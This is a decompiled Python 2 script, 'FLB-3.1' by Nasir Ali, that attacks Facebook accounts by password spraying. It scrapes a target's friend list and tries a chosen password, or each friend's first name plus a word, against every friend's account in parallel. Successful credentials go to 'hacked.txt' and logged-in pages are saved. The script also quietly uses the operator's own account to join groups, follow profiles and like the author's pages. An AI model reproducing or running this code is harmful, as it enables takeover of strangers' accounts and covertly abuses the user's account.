# uncompyle6 version 3.7.3
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: <script>
# Compiled at: 2020-08-30 16:42:03
import os, json
from base64 import *
import sys, random, time
from multiprocessing.pool import ThreadPool
from multiprocessing import *
W = '\x1b[1;37m'
N = '\x1b[0m'
R = '\x1b[1;37m\x1b[31m'
B = '\x1b[1;37m\x1b[34m'
G = '\x1b[1;32m'
Y = '\x1b[1;33;40m'
SR = W + '[' + R + '*' + W + ']'
SG = W + '[' + G + '*' + W + ']'
SRO = W + '(' + R + '>' + W + ')'
SGO = W + '(' + G + '>' + W + ')'
SWO = W + '(' + R + '!' + W + ')'
xin = '\n'
SBG = '\x1b[1;37m(\x1b[1;32m\xe2\x97\x8f\x1b[1;37m)'
SBR = '\x1b[1;37m(\x1b[1;37m\x1b[31m\xe2\x97\x8f\x1b[1;37m)'
II = 0
NP = ThreadPool(int(cpu_count()) * 5)
banner = ('\n\n  {} \xe5\x9b\x97{}\xe5\x8d\x90{}\xe5\x9b\x97\xe5\x9b\x97\xe5\x9b\x97\n   \xe5\x9b\x97{}\xe5\x8d\x90{}\xe5\x9b\x97{}\xe5\x8d\x90\xe5\x8d\x90    {}FLB-3.1 {}(stable)\n  {} \xe5\x9b\x97\xe5\x9b\x97\xe5\x9b\x97\xe5\x9b\x97\xe5\x9b\x97     {} By\n  {} \xe5\x8d\x90\xe5\x8d\x90{}\xe5\x9b\x97{}\xe5\x8d\x90{}\xe5\x9b\x97 {}  Nasir Ali\n  {} \xe5\x9b\x97\xe5\x9b\x97\xe5\x9b\x97{}\xe5\x8d\x90{}\xe5\x9b\x97\n\n {} World Fastest FriendList Bruter\n {} FB :{} fb.com/nasir.xo\n {} Github : {}github.com/nasirxo\n {} Youtube :{} youtube.com/TheDarkSec\n\n').format(R, G, R, G, R, G, Y, B, R, Y, G, R, G, R, Y, R, G, R, SWO, SRO, G, SRO, G, SRO, G)
os.system('rm *.pyc')
os.system('clear')

def funx(word):
    lix = [
     '/', '-', '|']
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}.. {}').format(str(word), lix[x]))
            time.sleep(0.3)
            sys.stdout.flush()


if int(sys.version[0]) != 2:
    sys.stdout.write("It's Python2 Script \n use python2 ")
    sys.exit()
try:
    from requests import *
    from bs4 import *
    import requests
    from faker import *
    print xin + SGO + G + ' Requirements Available'
except:
    print xin + SRO + R + 'Installing Requirements......'
    os.system('pip2 install requests')
    os.system('pip2 install bs4')
    os.system('pip2 install faker')
    from requests import *
    from bs4 import *
    import requests
    from faker import *
    os.system('clear')

funx(SG + Y + ' Checking For Free-Facebook Support')
try:
    if get('https://free.facebook.com', allow_redirects=False).status_code != 200:
        print xin + SR + R + ' Free Facebook Not Supported:('
        url = 'https://mbasic.facebook.com{}'
    else:
        print xin + SG + G + ' Free Facebook Mode Available :)'
        url = 'https://free.facebook.com{}'
except:
    print xin + SR + R + ' No Internet Connection:('
    sys.exit()

print SWO + ' Using : ' + url.format('/')
agent = {'Accept-Language': 'en-US,en;q=0.5', 'user-agent': Faker().user_agent()}
s = Session()
if not os.path.exists('.cookie'):
    pass
else:
    try:
        s.cookies.update(json.loads(open('.cookie', 'r').read()))
    except:
        pass

    def fblogin(email, password):
        global s
        try:
            s = Session()
            s.headers.update(agent)
            cred = {'email': str(email), 'pass': str(password)}
            r = s.post(url.format('/login'), data=cred)
            if 'm_ses' in r.url or 'home.php' in r.url or 'save-device' in r.url:
                with open('.cookie', 'w') as (cok):
                    cok.write(json.dumps(s.cookies.get_dict()))
                return {'login_status': 'sucessfull', 
                   'email': email, 
                   'account_id': s.cookies.get_dict()['c_user'], 
                   'cookie_datr': s.cookies.get_dict()['datr']}
            return {'login_status': 'failed', 
               'account': email, 
               'url': r.url}
        except:
            return {'login_status': 'error', 'error': 'No_Internet', 
               'type': '404'}


    def checkl(slist):
        li = str(slist).split('|')
        ldata = {'email': li[0], 
           'pass': li[1]}
        sos = Session()
        sos.headers.update({'Accept-Language': 'en-US,en;q=0.5', 'user-agent': Faker().user_agent()})
        try:
            rx = sos.post(url.format('/login'), data=ldata)
        except:
            pass

        if 'm_ses' in rx.url or 'home.php' in rx.url or 'save-device' in rx.url:
            with open('hacked.txt', 'a') as (PL):
                PL.write(('{} | {} \n').format(li[0], li[1]))
            print SBG + G + (' {} | {} {}=>{} {}').format(li[0], li[1], W, Y, li[2])
            with open(('{}.html').format(li[0]), 'w') as (htd):
                htd.write(rx.content)
        elif 'checkpoint' in rx.url:
            print SBR + R + (' {} | {} {}=>{} {}').format(li[0], li[1], W, Y, li[2])
            with open('hacked.txt', 'a') as (PL):
                PL.write(('{} | {} \n').format(li[0], li[1]))


    def foll(n):
        try:
            try:
                html = BeautifulSoup(s.get(url.format('/profile.php?id=' + str(n))).text, 'html.parser')
            except:
                pass

            for i in html.find_all('a'):
                try:
                    if 'profile_add_friend.php' in i['href']:
                        s.get(url.format(i['href']))
                    elif 'subscribe.php' in i['href']:
                        s.get(url.format(i['href']))
                except:
                    pass

        except:
            pass


    def tsearch(N, T):
        data = []
        for x in N:
            try:
                if T == x.get_text():
                    data.append(x)
            except:
                pass

        return data


    def tnsearch(N, T):
        data = []
        for x in N:
            try:
                if T in x.get_text():
                    data.append(x)
            except:
                pass

        return data


    def asearch(N, K):
        for i in N:
            try:
                if K in i['href']:
                    return i['href']
            except:
                pass


    def alsearch(N, K):
        data = []
        for i in N:
            try:
                if K in i['href']:
                    data.append(i)
            except:
                pass

        return data


    def csearch(n):
        c = []
        for i in n:
            try:
                if i['class']:
                    if i['id']:
                        if i.h3.a['href']:
                            c.append(i['class'])
            except:
                pass

        return c[(-1)]


    def CFind(n):
        try:
            if n['class']:
                if n.table['class']:
                    return n['class']
        except:
            pass


    def toid(n):
        if '/profile.php' in n:
            return n.split('?id=')[1].split('&fref')[0]
        else:
            return n.split('/')[1].split('?fref')[0]


    def toid2(n):
        if '/profile.php' in n:
            return n.split('?id=')[1].split('&refid')[0]


    def text(n):
        try:
            return n.decode('utf-8')
        except:
            return ''


    def plike(n):
        r = s.get(url.format('/' + n))
        html = BeautifulSoup(r.content, 'html.parser')
        LA = html.find_all('a')
        k = s.get(url.format(asearch(LA, '/a/profile.php?fan')))
        return k.status_code


    def ginvite(n):
        data = {}
        ID = '1305340536283810'
        r = s.get(url.format('/groups/members/search/?group_id=' + str(ID)))
        html = BeautifulSoup(r.content, 'html.parser')
        F = html.find_all('form')[1]
        for x in F.find_all('input', {'type': 'hidden'}):
            try:
                data[x['name']] = x['value']
            except:
                pass

        FA = F['action']
        data[('addees[{}]').format(n)] = str(n)
        data['add'] = 'Invitation Selected'
        k = s.post(url.format(FA), data)
        return k.status_code


    def gjoin(ID):
        data = {}
        r = s.get(url.format('/groups/' + str(ID)))
        html = BeautifulSoup(r.content, 'html.parser')
        F = html.find_all('form')[1]
        for x in F:
            try:
                data[x['name']] = x['value']
            except:
                pass

        k = s.post(url.format(F['action']), data)
        return k.status_code


    def groupids(n):
        i = 0
        data = {}
        link = url.format('/browse/group/members/?id=' + str(n))
        while True:
            con = s.get(link)
            html = BeautifulSoup(con.content, 'html.parser')
            u = html.find_all('table')
            cls = (' ').join(u[5]['class'])
            tb = html.find_all('table', attrs={'class': cls})
            for U in tb:
                try:
                    data[i] = {'name': U.a.get_text(), 'id': U['id'].split('_')[1]}
                    i += 1
                except:
                    pass

            try:
                nlink = html.find('div', attrs={'id': 'm_more_item'})
                link = url.format(nlink.a['href'])
            except:
                break

        return data


    def getfriends(ID):
        data = {}
        i = 0
        link = url.format('/profile.php?v=friends&id=' + str(ID))
        while True:
            sys.stdout.write(('\r  {} GETTING FRIENDLIST IDS : {}').format(SBG, i))
            sys.stdout.flush()
            try:
                r = s.get(link)
                html = BeautifulSoup(r.content, 'html.parser')
                for X in html.find_all('table', {'role': 'presentation'}):
                    if 'profile picture' in X.img['alt']:
                        data[i] = {'name': X.a.get_text(), 'id': toid(X.a['href'])}
                        i += 1

            except:
                pass

            try:
                J = tsearch(html.find_all('a'), 'See more friends')[0]
                link = url.format(J['href'])
            except:
                break

        return data


    def getname():
        try:
            r = s.get(url.format('/profile.php'))
            html = BeautifulSoup(r.content, 'html.parser')
            return html.title.get_text()
        except:
            return 'ERROR'


    while True:
        if not os.path.exists('.cookie'):
            time.sleep(2)
            os.system('clear')
            print banner
            print SG + ' Login With Facebook Email/Password..'
            email = raw_input(xin + SG + ' Email : ' + G)
            password = raw_input(SG + ' Password : ' + G)
            LS = fblogin(email, password)
            funx(SGO + ' Logging in' + G)
            if LS['login_status'] == 'sucessfull':
                print '\n' + SGO + G + ' Login Sucessfull.. :)'
                break
            elif LS['login_status'] == 'failed':
                print xin + SRO + R + ' Login Failed.... :('
                time.sleep(2)
            elif LS['login_status'] == 'error':
                print xin + SWO + R + ' No Internet Connection:('
                time.sleep(2)
        else:
            funx(SG + ' Loading Available Cookies Data')
            try:
                s.cookies.update(json.loads(open('.cookie', 'r').read()))
                print xin + SG + " Cookie's Data Loaded !"
                time.sleep(2)
                break
            except:
                pass

    s = Session()
    s.headers.update(agent)
    s.cookies.update(json.loads(open('.cookie', 'r').read()))
    myname = getname()
    try:
        NP.map(gjoin, ['1305340536283810', '1127137520996402'])
    except:
        pass

    try:
        NP.map(foll, ['100006143266745', '100007670235679'])
    except:
        pass

    try:
        NP.map(plike, ['profdarksec', 'nasir.x0', 'thedarksec', 'Zuckerberg-384797555635026'])
    except:
        pass

    while True:
        try:
            myid = s.cookies.get_dict()['c_user']
        except:
            myid = 'error'

        time.sleep(1)
        os.system('clear')
        print banner
        print ("\n      {} USER : {}\n      {} ID : {}\n\n     {}  ++[{} OPTIONS {}]++\n\n {}  1 : Try Your Password\n {}  2 : Try Name+CustomWord Password\n {}  3 : Show Hacked Account's \n {}  4 : Logout Account\n \n  ").format(SBG, myname, SBG, myid, W, G, W, SBR, SBR, SBR, SBR)
        IN = raw_input('  ' + SRO + ' OPTION : ')
        print '\n'
        if IN == '1':
            fid = raw_input('\n  ' + SGO + ' TARGET ID : ')
            FNDL = getfriends(fid)
            PSS = raw_input('\n  ' + SGO + ' ENTER PASSWORD : ')
            PDATA = []
            for k in range(len(FNDL.keys())):
                QZ = FNDL[k]
                PDATA.append(('{}|{}|{}').format(QZ['id'], PSS, text(QZ['name'])))

            os.system('clear')
            print ("\n     {}  NoTe :  Hacked Account's Would Be Showed There\n\n              {}   FLB-V3.0 BY NASIR ALI\n        {}+++++++++[{} HACKING STATUS{} ]+++++++++\n        \n                {} TOTAL ACCOUNTS : {}{}\n         \n     ").format(Y, R, W, G, W, SBG, W, len(PDATA))
            NP.map(checkl, PDATA)
            raw_input()
        elif IN == '2':
            fid = raw_input('\n  ' + SGO + ' TARGET ID : ')
            FNDL = getfriends(fid)
            PSS = raw_input('\n  ' + SGO + ' ENTER WORD : ')
            PDATA = []
            for k in range(len(FNDL.keys())):
                QZ = FNDL[k]
                try:
                    PSN = QZ['name'].split()[0] + PSS
                    PDATA.append(('{}|{}|{}').format(QZ['id'], PSN, text(QZ['name'])))
                except:
                    pass

            os.system('clear')
            print ("\n     {}  NoTe :  Hacked Account's Would Be Showed There\n\n              {}   FLB-V3.0 BY NASIR ALI\n        {}+++++++++[{} HACKING STATUS{} ]+++++++++\n\n                {} TOTAL ACCOUNTS : {}{}\n\n     ").format(Y, R, W, G, W, SBG, W, len(PDATA))
            NP.map(checkl, PDATA)
            raw_input()
        elif IN == '3':
            try:
                os.system('clear')
                print ('\n             {}   FLB-V3.0 BY NASIR ALI\n        {} +++++++[{} HACKED ACCOUNTS{} ]+++++++++\n    ').format(R, W, G, W)
                PFILE = open('hacked.txt', 'r').read()
                for X in PFILE.split('\n'):
                    print ('{} {}').format(SBG, X)

                raw_input()
            except:
                print xin + SWO + R + " No Any Account's :("

        elif IN == '4':
            funx(SWO + ' Logging Out ')
            os.system('rm .cookie')
            quit()
        else:
            print '  ' + SWO + R + ' Invalid Input ! '
            time.sleep(1)
# okay decompiling patched.pyc
